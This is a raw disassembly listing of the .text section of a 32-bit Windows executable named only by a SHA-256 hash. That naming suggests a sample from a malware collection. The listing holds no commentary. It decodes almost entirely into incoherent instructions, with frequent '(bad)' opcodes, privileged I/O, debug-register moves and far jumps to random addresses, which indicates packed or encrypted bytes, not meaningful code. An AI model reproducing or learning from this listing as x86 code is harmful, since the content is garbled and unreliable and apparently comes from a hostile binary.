
dd01ae6008690f844482c1f0419754a0c69c3bb33990947274bb8291b3d1cf23.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	pop    esi
  411001:	adc    eax,0x536d2c32
  411006:	aas    
  411007:	xchg   BYTE PTR [eax+0x4f6e3e6e],ah
  41100d:	fisubr WORD PTR [ebp+0x6c]
  411010:	adc    edx,eax
  411012:	adc    al,0x96
  411014:	fcom   QWORD PTR [edx+0x7cd76f3c]
  41101a:	test   eax,0x5da222d
  41101f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411020:	jo     0x410fb2
  411022:	inc    ebx
  411023:	nop
  411024:	fucom  st(7)
  411026:	mul    eax
  411028:	out    dx,eax
  411029:	jb     0x411082
  41102b:	mov    ah,0xc0
  41102d:	pop    ss
  41102e:	mov    eax,ds:0x90d0c984
  411033:	mov    ebx,0x891a1453
  411038:	pop    ebp
  411039:	mov    dl,0xa6
  41103b:	sub    eax,0xbd7f38d9
  411040:	and    BYTE PTR [eax+0x78],0x6
  411044:	dec    esi
  411045:	lods   al,BYTE PTR ds:[esi]
  411046:	mov    ?,WORD PTR cs:[edi+0x61]
  41104a:	mov    al,0xa5
  41104c:	dec    ecx
  41104d:	fiadd  DWORD PTR [edi-0x5a7f101c]
  411053:	retf   
  411054:	in     eax,dx
  411055:	fs hlt 
  411057:	jp     0x41104d
  411059:	push   edx
  41105a:	mov    ch,0xad
  41105c:	pop    ss
  41105d:	in     eax,0x1a
  41105f:	xchg   ebp,eax
  411060:	stc    
  411061:	test   BYTE PTR ds:0xd37a5e96,cl
  411067:	pop    eax
  411068:	and    al,0x1e
  41106a:	push   0x7ba4c313
  41106f:	mov    ah,0x1
  411071:	cld    
  411072:	lahf   
  411073:	sar    BYTE PTR [edi+0x57bb4bbd],1
  411079:	push   ds
  41107a:	mov    ebp,ebx
  41107c:	iret   
  41107d:	dec    ecx
  41107e:	mov    al,0xa5
  411080:	jb     0x4110cd
  411082:	jb     0x41103e
  411084:	xlat   BYTE PTR ds:[ebx]
  411085:	cmp    DWORD PTR [ebp-0x162d3373],ebp
  41108b:	adc    BYTE PTR [ebp+0x636b1e9d],ch
  411091:	push   ss
  411092:	dec    eax
  411093:	ret    0x2fd4
  411096:	int3   
  411097:	popa   
  411098:	in     al,dx
  411099:	loope  0x411038
  41109b:	loope  0x4110a5
  41109d:	lahf   
  41109e:	mov    ebx,0x23530e8b
  4110a3:	sbb    eax,0x8c94f077
  4110a8:	sub    al,0x22
  4110aa:	ror    BYTE PTR [edx+ecx*1],cl
  4110ad:	mov    ah,0x10
  4110af:	dec    edi
  4110b0:	inc    eax
  4110b1:	or     al,0xaa
  4110b3:	sbb    bh,al
  4110b5:	jl     0x411039
  4110b7:	xor    eax,0x9cb75796
  4110bc:	inc    esi
  4110bd:	sub    BYTE PTR [eax],dl
  4110bf:	or     al,0x8d
  4110c1:	cmp    BYTE PTR [ecx-0xb232334],al
  4110c7:	jmp    0x54b43d05
  4110cc:	retf   0x9a03
  4110cf:	jmp    0xe32a:0x2e1e2f67
  4110d6:	test   eax,0x330330c7
  4110db:	outs   dx,BYTE PTR ds:[esi]
  4110dc:	fbstp  TBYTE PTR [ecx]
  4110de:	scas   eax,DWORD PTR es:[edi]
  4110df:	mov    ds:0x6aaea20,al
  4110e4:	push   ecx
  4110e5:	pop    ebp
  4110e6:	loop   0x41107f
  4110e8:	loopne 0x4110a2
  4110ea:	mov    cs,WORD PTR [esi+0x42484024]
  4110f0:	inc    ebx
  4110f1:	(bad)  
  4110f2:	lods   al,BYTE PTR ds:[esi]
  4110f3:	aad    0x82
  4110f5:	stos   BYTE PTR es:[edi],al
  4110f6:	mov    ecx,0x369dc2ae
  4110fb:	push   ds
  4110fc:	clc    
  4110fd:	pop    eax
  4110fe:	icebp  
  4110ff:	imul   edx,DWORD PTR [edi+0x64],0x6060a10e
  411106:	test   bh,al
  411108:	add    al,0x15
  41110a:	cmp    ecx,DWORD PTR [eax+0x7c]
  41110d:	cli    
  41110e:	in     al,dx
  41110f:	imul   edx,DWORD PTR [esi],0x5a
  411112:	lea    edx,[esp+eiz*2-0x19]
  411116:	xor    eax,0x953993b0
  41111b:	cdq    
  41111c:	adc    al,0xd9
  41111e:	movlps xmm4,QWORD PTR [edx+edx*4+0x51bab605]
  411126:	cld    
  411127:	cs pop ds
  411129:	sahf   
  41112a:	(bad)  
  41112b:	outs   dx,BYTE PTR ds:[esi]
  41112c:	mov    cx,0x9699
  411130:	neg    bh
  411132:	imul   esp,DWORD PTR [ebx+0x49],0xdf71b4de
  411139:	xchg   esp,eax
  41113a:	(bad)  
  41113b:	inc    edx
  41113c:	mov    esp,0x7950196f
  411141:	(bad)  
  411142:	std    
  411143:	push   es
  411144:	bound  esp,QWORD PTR [ebp+0x9]
  411147:	or     bl,BYTE PTR [edx]
  411149:	lods   al,BYTE PTR ds:[esi]
  41114a:	push   ecx
  41114b:	jbe    0x41113f
  41114d:	dec    ebp
  41114e:	xchg   esi,eax
  41114f:	dec    edx
  411150:	sub    BYTE PTR [ebp-0x46625080],bh
  411156:	hlt    
  411157:	ja     0x4110fc
  411159:	push   ds
  41115a:	xchg   ebp,eax
  41115b:	push   0x3b8398f7
  411160:	(bad)  
  411161:	jmp    0x571a:0x746330f4
  411168:	out    dx,eax
  411169:	into   
  41116a:	lds    edi,FWORD PTR [eax-0x55]
  41116d:	imul   esp,DWORD PTR [edi+0x31b4f3b2],0xffffffa5
  411174:	ret    
  411175:	popa   
  411176:	inc    eax
  411177:	inc    bp
  411179:	add    al,dl
  41117b:	xor    al,0x5
  41117d:	jp     0x4111fd
  41117f:	mov    esi,0x74285414
  411184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411185:	retf   0x665c
  411188:	inc    esi
  411189:	or     bh,BYTE PTR [edi+0x1f3139b5]
  41118f:	adc    bl,0x28
  411192:	into   
  411193:	jl     0x411207
  411195:	out    dx,al
  411196:	mov    bl,0xa5
  411198:	xor    esi,DWORD PTR [eax]
  41119a:	jmp    0xda51ee80
  41119f:	mov    esi,0x7f07d530
  4111a4:	and    eax,0x1f63329e
  4111a9:	scas   al,BYTE PTR es:[edi]
  4111aa:	repnz popa 
  4111ac:	cdq    
  4111ad:	jns    0x411134
  4111af:	sbb    BYTE PTR [edi+0x2b556714],bh
  4111b5:	mov    esi,0x288d8a07
  4111ba:	mov    esp,0x55c030f9
  4111bf:	lea    esi,[ecx]
  4111c1:	dec    esp
  4111c2:	adc    DWORD PTR [edx+0x20ccf69],0xffffffed
  4111c9:	jg     0x411172
  4111cb:	sub    BYTE PTR [eax+0x1297dcb6],dh
  4111d1:	(bad)  
  4111d2:	pop    esi
  4111d3:	inc    ebx
  4111d4:	pop    ecx
  4111d5:	sub    DWORD PTR [ecx],esi
  4111d7:	test   BYTE PTR [ebp-0x47],dh
  4111da:	sar    BYTE PTR [ebx+0x2c],cl
  4111dd:	cld    
  4111de:	ret    0x8877
  4111e1:	scas   al,BYTE PTR es:[edi]
  4111e2:	and    edi,DWORD PTR [edx-0x64006638]
  4111e8:	xor    ecx,DWORD PTR [eax]
  4111ea:	sbb    eax,0x96a8150c
  4111ef:	(bad)  
  4111f0:	std    
  4111f1:	sub    ebp,DWORD PTR [esi+0x534ae137]
  4111f7:	mov    ah,0xc5
  4111f9:	cli    
  4111fa:	xor    ecx,ebp
  4111fc:	sbb    ebp,ebp
  4111fe:	xor    DWORD PTR [ebp-0x78bea52d],esp
  411204:	push   ebp
  411205:	jb     0x41125e
  411207:	mov    DWORD PTR [esi+0x4d74387a],eax
  41120d:	inc    ebp
  41120e:	add    ebx,ebx
  411210:	or     al,0x8f
  411212:	sbb    DWORD PTR [ecx],edi
  411214:	jl     0x411260
  411216:	(bad)  
  411217:	lahf   
  411218:	aad    0xe0
  41121a:	push   esp
  41121b:	adc    ebp,DWORD PTR [esp+eiz*2]
  41121e:	push   ecx
  41121f:	xchg   edx,eax
  411220:	jbe    0x411281
  411222:	dec    ebp
  411223:	mov    edx,0x123d2cc7
  411228:	mov    ds:0x84f22320,eax
  41122d:	mov    ch,0x54
  41122f:	idiv   bl
  411231:	pop    ebx
  411232:	dec    edx
  411233:	jbe    0x41123c
  411235:	mov    ebx,0xfe461d67
  41123a:	add    cl,bh
  41123c:	xor    eax,0x4505fa0
  411241:	cmp    al,0xf9
  411243:	mov    esi,0x608b2364
  411248:	xchg   ebx,eax
  411249:	cmp    DWORD PTR [ebp-0x64811a04],0x74ef2dcb
  411253:	cmp    al,BYTE PTR [edx+0x168d8977]
  411259:	inc    esp
  41125a:	sbb    al,0x2c
  41125c:	pop    esp
  41125d:	test   ch,ah
  41125f:	ror    BYTE PTR [eax+0x3211edf0],1
  411265:	cmp    ch,dl
  411267:	xor    eax,0xa072d5c6
  41126c:	adc    DWORD PTR [ebp-0x5],eax
  41126f:	mov    db7,edi
  411272:	hlt    
  411273:	jns    0x4112a5
  411275:	xor    dl,BYTE PTR [esp+ebx*1+0x50b611c4]
  41127c:	out    dx,al
  41127d:	in     eax,0x18
  41127f:	or     ebx,esi
  411281:	dec    eax
  411282:	jg     0x4112b9
  411284:	xchg   ebx,eax
  411285:	(bad)  
  411287:	int    0xcd
  411289:	inc    esp
  41128a:	xor    eax,0x7468f135
  41128f:	fcom   QWORD PTR [edi-0x6e1283da]
  411295:	outs   dx,DWORD PTR ds:[esi]
  411296:	shl    DWORD PTR [edi+ebp*4+0x64],cl
  41129a:	and    DWORD PTR [ebx],ebx
  41129c:	fisub  DWORD PTR [edx]
  41129e:	fcomp  st(3)
  4112a0:	sahf   
  4112a1:	repnz mov edi,0x8c439c4e
  4112a7:	or     cl,BYTE PTR [edx+0x7ec796a5]
  4112ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ae:	xchg   BYTE PTR [eax],ah
  4112b0:	push   cs
  4112b1:	jl     0x411332
  4112b3:	push   edi
  4112b4:	repnz int 0x7c
  4112b7:	imul   esi,DWORD PTR [ecx-0x66f6b18f],0xffffffe5
  4112be:	pop    edi
  4112bf:	mov    eax,0xa0ec6f18
  4112c4:	jmp    0xaf47d080
  4112c9:	pop    es
  4112ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112cb:	push   0x1fa3ab67
  4112d0:	sub    BYTE PTR [esp+esi*2],dl
  4112d3:	pop    esp
  4112d4:	cmp    edi,ebp
  4112d6:	sti    
  4112d7:	mov    dh,0x8d
  4112d9:	push   edi
  4112da:	jmp    DWORD PTR es:[esp+ebp*1]
  4112de:	sbb    BYTE PTR [eax],dh
  4112e0:	xchg   esp,eax
  4112e1:	leave  
  4112e2:	outs   dx,BYTE PTR ds:[esi]
  4112e3:	mov    cl,0x20
  4112e5:	pop    edx
  4112e6:	pop    es
  4112e7:	xor    eax,ecx
  4112e9:	pop    ebp
  4112ea:	stos   BYTE PTR es:[edi],al
  4112eb:	loop   0x4112c1
  4112ed:	(bad)  
  4112ee:	ret    
  4112ef:	(bad)  
  4112f0:	pop    eax
  4112f1:	fmul   QWORD PTR [eax-0x44]
  4112f4:	ja     0x4112b2
  4112f6:	add    edi,DWORD PTR [esi+ecx*2+0x34c36bf7]
  4112fd:	sbb    dl,dh
  4112ff:	xor    dh,bl
  411301:	call   0x3b5a68d7
  411306:	push   ebx
  411307:	in     eax,0x5f
  411309:	clc    
  41130a:	mov    al,0x4f
  41130c:	inc    ebp
  41130d:	or     al,0x3c
  41130f:	pop    esi
  411310:	add    ecx,edi
  411312:	inc    DWORD PTR [esi-0x16]
  411315:	sub    BYTE PTR [edi+0x661173fa],ch
  41131b:	xchg   ecx,eax
  41131c:	push   0x78
  41131e:	jnp    0x411376
  411320:	out    0x7f,eax
  411322:	inc    edx
  411323:	adc    dh,BYTE PTR [esi+0x7c]
  411326:	pop    esp
  411327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411328:	pop    esi
  411329:	stc    
  41132a:	jne    0x4112ec
  41132c:	and    DWORD PTR [eax+ecx*4],ebx
  41132f:	jbe    0x41139b
  411331:	push   edx
  411332:	cmp    ch,0x92
  411335:	stc    
  411336:	xchg   esi,eax
  411337:	mov    ?,esp
  411339:	push   ds
  41133a:	push   0xbad0a8b0
  41133f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411340:	(bad)  
  411341:	push   cs
  411342:	hlt    
  411343:	pop    edx
  411344:	in     eax,0x69
  411346:	fwait
  411347:	adc    DWORD PTR [esi],edi
  411349:	push   ebp
  41134a:	or     BYTE PTR [edi+ecx*2-0x73523250],al
  411351:	repnz fcos 
  411354:	adc    ecx,edx
  411356:	fnsave [esi-0x4a]
  411359:	pop    ebp
  41135a:	mov    BYTE PTR [edi-0x49],dl
  41135d:	in     eax,dx
  41135e:	add    al,0xb5
  411360:	dec    ebx
  411361:	xchg   BYTE PTR [edi-0x8],ch
  411364:	fimul  DWORD PTR [ecx+0x18]
  411367:	mov    ch,0x5f
  411369:	cld    
  41136a:	pop    ss
  41136b:	cwde   
  41136c:	data16 cmc 
  41136e:	jmp    0x411393
  411370:	ret    
  411371:	out    0xf1,al
  411373:	cmp    eax,0x4836136d
  411378:	jb     0x41130f
  41137a:	jg     0x411347
  41137c:	leave  
  41137d:	cmp    al,cl
  41137f:	ja     0x411366
  411381:	ins    DWORD PTR es:[edi],dx
  411382:	shr    BYTE PTR [ebp+eiz*4+0x7b68787e],cl
  411389:	popa   
  41138a:	(bad)  
  41138b:	icebp  
  41138c:	ret    
  41138d:	fcmovbe st,st(4)
  41138f:	inc    edi
  411390:	sbb    dh,BYTE PTR [esi-0x74]
  411393:	jbe    0x411384
  411395:	push   ebx
  411396:	fwait
  411397:	dec    ecx
  411398:	cmp    bl,bh
  41139a:	loope  0x4113a7
  41139c:	rcl    BYTE PTR [esi],0x2c
  41139f:	push   ebx
  4113a0:	popf   
  4113a1:	push   esp
  4113a2:	dec    esp
  4113a3:	cmp    eax,DWORD PTR [edi+0x1817c38e]
  4113a9:	retf   0xafed
  4113ac:	dec    ebx
  4113ad:	mov    ds:0x71e484b6,eax
  4113b2:	in     eax,0xf7
  4113b4:	(bad)  
  4113b5:	aam    0xdf
  4113b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b8:	push   cs
  4113b9:	fcmovne st,st(0)
  4113bb:	into   
  4113bc:	fisttp WORD PTR [ebp-0x6f]
  4113bf:	loop   0x41140f
  4113c1:	pop    ecx
  4113c2:	aad    0x2b
  4113c4:	pop    es
  4113c5:	test   al,0xfc
  4113c7:	leave  
  4113c8:	js     0x411420
  4113ca:	nop
  4113cb:	das    
  4113cc:	loope  0x4113d2
  4113ce:	mov    ecx,0x2a393bfa
  4113d3:	imul   ebp,DWORD PTR [ebp-0x2c5ba81],0x3e468901
  4113dd:	push   ebx
  4113de:	add    BYTE PTR [eax+ebp*2+0x73],bh
  4113e2:	mov    ecx,0xfa5b96f7
  4113e7:	mov    edx,0xf33f16a6
  4113ec:	(bad)  
  4113ed:	iret   
  4113ee:	dec    edx
  4113ef:	out    dx,al
  4113f0:	in     al,dx
  4113f1:	mov    WORD PTR [ebp+0x24],?
  4113f4:	xchg   edi,eax
  4113f5:	jnp    0x4113be
  4113f7:	cli    
  4113f8:	sub    ecx,0x8b0050cd
  4113fe:	mov    dh,0x54
  411400:	mov    eax,0xe5ceb9d1
  411405:	sahf   
  411406:	sub    edi,ecx
  411408:	sbb    BYTE PTR [ebp-0x1b7fb094],bl
  41140e:	sub    BYTE PTR [ebx+esi*2],dh
  411411:	adc    bh,bl
  411413:	in     eax,dx
  411414:	push   edx
  411415:	cwde   
  411416:	push   ebx
  411417:	adc    BYTE PTR [ebx+0xe19d581],dl
  41141d:	ss cmp eax,0x381846a5
  411423:	(bad)  
  411425:	mov    ebp,0xe004b4bf
  41142a:	dec    esi
  41142b:	cmc    
  41142c:	(bad)  
  41142d:	(bad)  
  41142f:	je     0x4113f6
  411431:	jae    0x4113d6
  411433:	sub    eax,0x77b5d0c8
  411438:	les    eax,FWORD PTR [esi-0x1ca7ed4]
  41143e:	inc    ebp
  41143f:	inc    esi
  411440:	sbb    DWORD PTR [eax+0x11],esi
  411443:	cmc    
  411444:	adc    al,0x3f
  411446:	fsub   st,st(0)
  411448:	xchg   ecx,eax
  411449:	sub    eax,0x6e4f45a7
  41144e:	inc    edi
  41144f:	adc    al,0xf9
  411451:	shl    ecx,cl
  411453:	div    BYTE PTR ds:0xb87f8c63
  411459:	pop    edx
  41145a:	ins    BYTE PTR es:[edi],dx
  41145b:	pop    ds
  41145c:	lock aaa 
  41145e:	(bad)  
  41145f:	cmp    eax,0x3cdc9812
  411464:	shl    DWORD PTR [eax+0x50578487],0xdc
  41146b:	aam    0x93
  41146d:	xor    edx,0x68
  411470:	mov    bh,0x0
  411472:	in     al,0xc5
  411474:	(bad)  
  411475:	shl    DWORD PTR [esi-0x75],1
  411478:	fwait
  411479:	ins    DWORD PTR es:[edi],dx
  41147a:	scas   al,BYTE PTR es:[edi]
  41147b:	mov    cl,0x38
  41147d:	adc    eax,0x9c466ce2
  411482:	cmp    DWORD PTR [esi+0x4b],0xffffffdc
  411486:	iret   
  411487:	mov    ecx,0x1d50aae8
  41148c:	pop    esp
  41148d:	outs   dx,BYTE PTR ds:[esi]
  41148e:	push   ebp
  41148f:	popa   
  411490:	sbb    BYTE PTR [ecx-0x49d659f2],al
  411496:	int3   
  411497:	imul   ebx,DWORD PTR [ebx+0x4e],0xffffff9e
  41149b:	inc    ecx
  41149c:	inc    eax
  41149d:	jg     0x41149f
  41149f:	and    al,0xf1
  4114a1:	stc    
  4114a2:	xchg   ebp,eax
  4114a3:	xor    ecx,0xf559bcaf
  4114a9:	popa   
  4114aa:	sahf   
  4114ab:	sbb    DWORD PTR [esp+edi*8+0x1feb3016],ecx
  4114b2:	daa    
  4114b3:	xchg   DWORD PTR [esp+ebp*2+0x23],eax
  4114b7:	call   0xc145:0x38edd577
  4114be:	data16 (bad) 
  4114c0:	fbstp  TBYTE PTR [edx+0x336caf1b]
  4114c6:	push   ebx
  4114c7:	call   0xb604c4e7
  4114cc:	push   ebx
  4114cd:	dec    esp
  4114ce:	and    ecx,edi
  4114d0:	sar    BYTE PTR [ebx-0x73],1
  4114d3:	or     ch,al
  4114d5:	aaa    
  4114d6:	or     edi,edx
  4114d8:	out    0x10,al
  4114da:	(bad)
  4114dd:	repz add BYTE PTR [eax+0x2fd62d57],bl
  4114e4:	(bad)  
  4114e5:	jp     0x4114f6
  4114e7:	and    edi,esi
  4114e9:	xor    eax,0xae56b815
  4114ee:	gs clc 
  4114f0:	xchg   ecx,eax
  4114f1:	push   ss
  4114f2:	jge    0x4114c3
  4114f4:	and    DWORD PTR [edx],0xc33b4b75
  4114fa:	cmp    ah,bh
  4114fc:	mov    eax,ebp
  4114fe:	stc    
  4114ff:	dec    ecx
  411500:	push   cs
  411501:	scas   al,BYTE PTR es:[edi]
  411502:	inc    edx
  411503:	mov    dl,0x2a
  411505:	ret    
  411506:	jno    0x41155d
  411508:	mov    DWORD PTR [esi],0x1a2da164
  41150e:	push   ds
  41150f:	mov    ss,esi
  411511:	or     al,0x1b
  411513:	add    eax,0x9d95007f
  411518:	inc    esp
  411519:	and    al,0xa9
  41151b:	xchg   esp,eax
  41151c:	xor    al,0x7f
  41151e:	jge    0x4114a3
  411520:	and    edx,edi
  411522:	lds    eax,FWORD PTR [ebx+0x19]
  411525:	cmp    al,0x2a
  411527:	(bad)  
  411528:	and    esi,edi
  41152a:	mov    bh,0x82
  41152c:	es mov esp,fs
  41152f:	shr    cl,cl
  411531:	ror    BYTE PTR [edx],1
  411533:	xchg   BYTE PTR [esi+0x1ddcaaab],ah
  411539:	xor    eax,0x27dbe8d1
  41153e:	pop    ebp
  41153f:	sbb    bl,ch
  411541:	sub    DWORD PTR [eax-0x26],esi
  411544:	adc    al,BYTE PTR [ecx+ebx*1-0x1a40e119]
  41154b:	jecxz  0x41159c
  41154d:	dec    ecx
  41154e:	ss push cs
  411550:	mov    ch,0xec
  411552:	mov    ebx,0xf93b9ffc
  411557:	repnz pop ecx
  411559:	xor    eax,0x217c46d7
  41155e:	mov    bl,0x50
  411560:	xor    ch,BYTE PTR [edi]
  411562:	hlt    
  411563:	dec    edx
  411564:	mov    DWORD PTR [ebp-0x63],ebp
  411567:	add    al,0xe
  411569:	jmp    0x41153b
  41156b:	mov    ds,ebp
  41156d:	outs   dx,BYTE PTR ds:[esi]
  41156e:	sub    esp,ebp
  411570:	jmp    0xc0778a99
  411575:	(bad)  
  411576:	test   BYTE PTR [ecx],0xb2
  411579:	sub    eax,0x4aafa978
  41157e:	mov    ch,0xf3
  411580:	inc    edx
  411581:	mov    al,0xff
  411583:	je     0x411558
  411585:	cmc    
  411586:	cmp    eax,0xb6dd8a24
  41158b:	ins    BYTE PTR es:[di],dx
  41158d:	sub    ebx,DWORD PTR ds:0x77fffc00
  411593:	jmp    0xd849:0x504db6bd
  41159a:	sub    cl,BYTE PTR [ebp+0x6bd13695]
  4115a0:	inc    esi
  4115a1:	dec    edi
  4115a2:	mul    DWORD PTR [edx+ebp*8]
  4115a5:	repz mov esi,DWORD PTR [esi+ecx*2]
  4115a9:	mov    dh,0xd7
  4115ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ac:	add    ch,cl
  4115ae:	ins    BYTE PTR es:[edi],dx
  4115af:	(bad)  
  4115b0:	repz cli 
  4115b2:	sub    eax,0x54c15808
  4115b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115b8:	jmp    0x57bf:0xd3f0b335
  4115bf:	or     DWORD PTR [esi-0x2e7d91e6],ebp
  4115c5:	out    dx,eax
  4115c6:	add    cl,BYTE PTR [eax]
  4115c8:	inc    eax
  4115c9:	fimul  DWORD PTR [ebx-0xa]
  4115cc:	and    eax,0x79e5c846
  4115d1:	test   eax,0x86370d17
  4115d6:	aaa    
  4115d7:	(bad)  
  4115d8:	retf   
  4115d9:	mov    bh,0x2c
  4115db:	ja     0x4115d7
  4115dd:	(bad)  
  4115de:	lods   al,BYTE PTR ds:[esi]
  4115df:	popa   
  4115e0:	add    eax,0xdefe4ac6
  4115e5:	loopne 0x41161e
  4115e7:	enter  0xe8b9,0xd9
  4115eb:	addr16 fwait
  4115ed:	add    al,0x32
  4115ef:	xor    al,0x24
  4115f1:	popa   
  4115f2:	repnz int3 
  4115f4:	inc    edi
  4115f5:	ds mov ah,0x3c
  4115f8:	int    0xfd
  4115fa:	ret    
  4115fb:	nop
  4115fc:	mov    ecx,0x20b70dca
  411601:	or     ebp,DWORD PTR [eax]
  411603:	xchg   ebp,eax
  411604:	pop    ebp
  411605:	push   0xffffffb8
  411607:	jmp    0x41159f
  411609:	xor    BYTE PTR ds:0xee22cf43,al
  41160f:	adc    DWORD PTR [eax-0x62],0x2c
  411613:	jb     0x411669
  411615:	gs pop eax
  411617:	gs push ecx
  411619:	ins    DWORD PTR es:[edi],dx
  41161a:	out    dx,al
  41161b:	jmp    0x4115dc
  41161d:	jmp    0x4115c6
  41161f:	push   edi
  411620:	call   0xbe22:0x9f346312
  411627:	js     0x411628
  411629:	aam    0xe1
  41162b:	pop    edx
  41162c:	clc    
  41162d:	(bad)  
  41162e:	ror    bh,0x8a
  411631:	hlt    
  411632:	push   0xfffffff9
  411634:	test   DWORD PTR [esp+edi*1+0x53dc4724],ecx
  41163b:	push   ebx
  41163c:	rol    ebp,0x95
  41163f:	sbb    ebx,ebp
  411641:	xor    eax,DWORD PTR [ebx+0x3c]
  411644:	shr    DWORD PTR fs:[edi+0x25ff253],cl
  41164b:	imul   edx,DWORD PTR [edi-0x3d],0x6456eb4c
  411652:	dec    edi
  411653:	add    BYTE PTR [eax+0x11],0x3f
  411657:	xlat   BYTE PTR ds:[ebx]
  411658:	fwait
  411659:	push   esp
  41165a:	std    
  41165b:	in     al,0x6d
  41165d:	cwde   
  41165e:	xor    al,0xf1
  411660:	push   eax
  411661:	shr    BYTE PTR [ecx+0x422edaba],cl
  411667:	adc    esi,eax
  411669:	lds    eax,FWORD PTR [ecx+esi*1+0x74]
  41166d:	popa   
  41166e:	shr    BYTE PTR [edx+0x4b],cl
  411671:	sbb    eax,0x63ca8881
  411676:	mov    al,0x34
  411678:	sub    ah,BYTE PTR [ebx]
  41167a:	stc    
  41167b:	jno    0x4116be
  41167d:	jp     0x41162f
  41167f:	pop    eax
  411680:	stc    
  411681:	mov    BYTE PTR [ebx],ch
  411683:	jne    0x411624
  411685:	push   ebx
  411686:	jne    0x41160a
  411688:	xlat   BYTE PTR ds:[ebx]
  411689:	mov    eax,ds:0xa791ea9e
  41168e:	adc    DWORD PTR [ecx-0x3e7bd4dd],edi
  411694:	jmp    0xd0fef5fc
  411699:	cli    
  41169a:	loope  0x41168b
  41169c:	add    dl,BYTE PTR [ebx-0x7ee2a83]
  4116a2:	je     0x4116a9
  4116a4:	pop    esp
  4116a5:	rcr    DWORD PTR [edx+edi*8-0x6b],cl
  4116a9:	lods   eax,DWORD PTR ds:[esi]
  4116aa:	in     al,0x29
  4116ac:	cmp    ah,dh
  4116ae:	cmp    eax,0xa1443ff6
  4116b3:	jne    0x41171c
  4116b5:	mov    al,ds:0x1407956b
  4116ba:	mov    esi,cs
  4116bc:	call   0xfbb3:0xf5a1d029
  4116c3:	mov    eax,edx
  4116c5:	(bad)  
  4116c6:	in     al,0x40
  4116c8:	sub    esp,DWORD PTR [edi]
  4116ca:	daa    
  4116cb:	sbb    al,0xea
  4116cd:	out    0x5,eax
  4116cf:	mov    BYTE PTR [edx],dl
  4116d1:	adc    DWORD PTR [ecx],ecx
  4116d3:	stos   DWORD PTR es:[edi],eax
  4116d4:	arpl   WORD PTR [esi+ecx*8+0x469f0f06],bx
  4116db:	ja     0x411696
  4116dd:	ja     0x41171f
  4116df:	xchg   ebp,eax
  4116e0:	rcl    BYTE PTR [ebx-0x4418f056],cl
  4116e6:	adc    BYTE PTR [esi-0x59],0xff
  4116ea:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4116ec:	jbe    0x411678
  4116ee:	push   edx
  4116ef:	js     0x4116bc
  4116f1:	neg    BYTE PTR [ebx-0x2214db0a]
  4116f7:	outs   dx,DWORD PTR ds:[esi]
  4116f8:	aam    0xeb
  4116fa:	(bad)  
  4116fb:	xchg   esi,eax
  4116fc:	and    bl,BYTE PTR [eax-0x17]
  4116ff:	cmp    ebx,esp
  411701:	push   edx
  411702:	outs   dx,DWORD PTR ds:[esi]
  411703:	dec    ecx
  411704:	rcl    DWORD PTR [ebp+0xc],cl
  411707:	xchg   ebp,eax
  411708:	mov    eax,ds:0x958efeaf
  41170d:	popf   
  41170e:	xor    edx,esp
  411710:	jb     0x4116b9
  411712:	rcr    BYTE PTR [edx],1
  411714:	or     al,0x22
  411716:	and    ax,0xa0f0
  41171a:	push   edi
  41171b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41171c:	es cwde 
  41171e:	xchg   edi,eax
  41171f:	aas    
  411720:	ds ja  0x41171d
  411723:	pop    edx
  411724:	push   esp
  411725:	pop    ecx
  411726:	jmp    0xdb5ce257
  41172b:	sub    cl,cl
  41172d:	push   ebx
  41172e:	xchg   edx,eax
  41172f:	in     al,dx
  411730:	ja     0x4116ce
  411732:	add    ah,BYTE PTR [edi-0x45]
  411735:	repnz sub al,0xcc
  411738:	jl     0x4116d5
  41173a:	hlt    
  41173b:	cli    
  41173c:	sbb    bh,ch
  41173e:	add    DWORD PTR [ebp-0x54],ecx
  411741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411742:	out    dx,al
  411743:	jg     0x4117c3
  411745:	mov    ebp,0xf910a2e3
  41174a:	mov    dh,0x6d
  41174c:	scas   al,BYTE PTR es:[edi]
  41174d:	push   cs
  41174e:	nop    DWORD PTR [eax-0x343efe3f]
  411755:	lods   al,BYTE PTR ds:[esi]
  411756:	es xor eax,0x734e2048
  41175c:	pop    ecx
  41175d:	inc    esi
  41175e:	xchg   DWORD PTR ds:0xab92c4fa,esi
  411764:	sar    BYTE PTR [ebp-0x337d6610],1
  41176a:	les    edx,FWORD PTR [ebx]
  41176c:	sbb    al,0x7e
  41176e:	jge    0x411735
  411770:	hlt    
  411771:	lock sbb eax,edx
  411774:	mov    bh,0xf0
  411776:	test   al,0xbe
  411778:	mov    cl,0xf7
  41177a:	stos   BYTE PTR es:[edi],al
  41177b:	(bad)  
  41177c:	jge    0x4117e5
  41177e:	or     edx,DWORD PTR [ebp+0x31]
  411781:	cmp    eax,0x97172825
  411786:	mov    ecx,ecx
  411788:	cwde   
  411789:	mov    cs,edx
  41178b:	mov    ds:0x375e8fed,al
  411790:	aas    
  411791:	jg     0x41174d
  411793:	sub    DWORD PTR [esi-0x54],ebx
  411796:	rol    BYTE PTR [eax+edx*8],1
  411799:	aam    0x35
  41179b:	or     ebx,DWORD PTR [esi+0x754893f3]
  4117a1:	xchg   DWORD PTR [esp+ebx*4+0x6cdcf7d9],esi
  4117a8:	sub    esi,edx
  4117aa:	rol    BYTE PTR [eax+0x4f6b10c9],cl
  4117b0:	popf   
  4117b1:	sbb    al,0xca
  4117b3:	cmp    DWORD PTR [ecx+0x74],esp
  4117b6:	lods   al,BYTE PTR ds:[esi]
  4117b7:	push   esi
  4117b8:	out    0xa3,eax
  4117ba:	jb     0x411791
  4117bc:	arpl   WORD PTR [esi+0x600d4ed3],di
  4117c2:	in     al,dx
  4117c3:	xor    BYTE PTR [esi],bh
  4117c5:	rcl    DWORD PTR [esi+ebp*1-0x11],cl
  4117c9:	xchg   ecx,eax
  4117ca:	cmp    cl,BYTE PTR ds:[edx]
  4117cd:	mov    ds:0x3ba6bb6f,al
